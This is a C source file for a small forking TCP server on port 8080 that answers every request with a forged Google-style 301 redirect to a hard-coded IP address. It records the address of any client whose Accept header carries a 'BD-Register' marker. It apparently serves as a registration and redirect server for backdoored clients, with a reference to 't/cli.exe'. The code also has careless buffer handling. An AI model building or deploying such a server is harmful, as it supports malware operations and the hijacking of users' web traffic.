//220.117.227.244
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h> 
#include <sys/socket.h>
#include <netinet/in.h>
#include <dirent.h>

#define PORT 8080
#define BUFSIZE	30000
#define SERVERIP "54.214.248.168"

char buffer[BUFSIZE];
char logpath[] = "t/a";
char msg[] = "HTTP/1.1 301 Moved Permanently\r\n"
"Location: http://" SERVERIP "/\r\n"
"Content-Type: text/html; charset=UTF-8\r\n"
"Date: Thu, 09 May 2013 07:42:57 GMT\r\n"
"Expires: Sat, 08 Jun 2013 07:42:57 GMT\r\n"
"Cache-Control: public, max-age=2592000\r\n"
"Server: gws\r\n"
"Content-Length: 219\r\n"
"X-XSS-Protection: 1; mode=block\r\n"
"X-Frame-Options: SAMEORIGIN\r\n"
"\r\n"
"<HTML><HEAD><meta http-equiv=\"content-type\" content=\"text/html;charset=utf-8\">\r\n"
"<TITLE>301 Moved</TITLE></HEAD><BODY>\r\n"
"<H1>301 Moved</H1>\r\n"
"The document has moved\r\n"
"<A HREF=\"http://" SERVERIP "/\">here</A>.\r\n"
"</BODY></HTML>\r\n"
"\r\n"
"\r\n";


void AddLog( char *f, char *msg )
{
return;
	FILE *fp = fopen( f, "at" );
	fseek( fp, 0, SEEK_END );
	fputs( msg, fp );
	fputs( "\n", fp );
	fclose( fp );
}


char *myntoa( struct in_addr addr )
{
	char *res = (char*)malloc(100);

	unsigned char tmp[5] = {0,};

	memcpy( tmp, &addr, 4 );

	sprintf( res, "%d.%d.%d.%d", 
			 tmp[0], 
			 tmp[1], 
			 tmp[2], 
			 tmp[3] );
	return res;
}


void doprocessing( int s, struct in_addr cli_ip )
{
	int readlen;
	int totallen = 0;
	struct sockaddr_in s_in;

#define BUFFERINGLEN	1000
	char buffering[BUFFERINGLEN];

	memset( buffer, 0, BUFSIZE );

	while( 1 )
	{
		readlen = read( s, buffering, BUFFERINGLEN );
		if( readlen == 0 )
			break;
		totallen += readlen;
		if( totallen >= BUFSIZE )
			break;
		strncat( buffer, buffering, BUFSIZE );
		if( strstr( buffer, "\r\n\r\n" ) != NULL ||
			strstr( buffer, "\n\n" ) != NULL )
			break;
	}
	
	write( s, msg, sizeof(msg) );

	char *tmpstr = myntoa( cli_ip );
	printf( "connection from %s\n", tmpstr );
	free( tmpstr );

#define ACCEPTLEN 2000
	char acceptline[ACCEPTLEN];
	char *tmp;
	tmp = strstr( buffer, "Accept: " );
	if( tmp != NULL )
	{
		strncpy( acceptline, tmp, ACCEPTLEN );
		tmp = strchr( acceptline, '\n' );
		if( tmp != NULL )
			*tmp = 0;
	}
	else
		goto _end;

	char *exists = strstr( acceptline, "BD-Register" );
	if( exists == NULL )
		goto _end;

	char *ip = myntoa( cli_ip );
	printf( "client registered from %s\n", ip );
	AddLog( logpath, ip );
	free( ip );

_end:
	close( s );

}

int main( int argc, char *argv[] )
{
	int sockfd, newsockfd, clilen;
	struct sockaddr_in serv_addr, cli_addr;
	int  n;
	int pid = 0;

	// check tmp directory, create it
	DIR *dir = opendir( "t" );
	if( dir == NULL )
		system( "mkdir t" );
	else
		closedir( dir );

	AddLog( logpath, "t/cli.exe" );

	/* First call to socket() function */
	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if (sockfd < 0) 
	{
		perror("ERROR opening socket");
		return -1;
	}
	/* Initialize socket structure */
	bzero((char *) &serv_addr, sizeof(serv_addr));
	serv_addr.sin_family = AF_INET;
	serv_addr.sin_addr.s_addr = INADDR_ANY;
	serv_addr.sin_port = htons(PORT);
 
int option=1;
setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &option, sizeof(int));

	/* Now bind the host address using bind() call.*/
	if (bind(sockfd, (struct sockaddr *) &serv_addr,
						sizeof(serv_addr)) < 0)
	{
		perror("ERROR on binding");
		return -1;
	}
	/* Now start listening for the clients, here 
	* process will go in sleep mode and will wait 
	* for the incoming connection
	*/
	listen(sockfd,5);
	clilen = sizeof(cli_addr);
	printf( "listening on port %d\n", PORT );

	while (1) 
	{
		newsockfd = accept(sockfd, 
				(struct sockaddr *) &cli_addr, &clilen);
		
		if (newsockfd < 0)
		{
			perror("ERROR on accept");
			return -1;
		}
		/* Create child process */
		pid = fork();
		if (pid < 0)
		{
			perror("ERROR on fork");
			return -1;
		}
		if (pid == 0)  
		{
			/* This is the client process */
			close(sockfd);
			doprocessing(newsockfd, cli_addr.sin_addr);
			exit(0);
		}
		else
		{
			close(newsockfd);
		}
	} /* end of while */
}
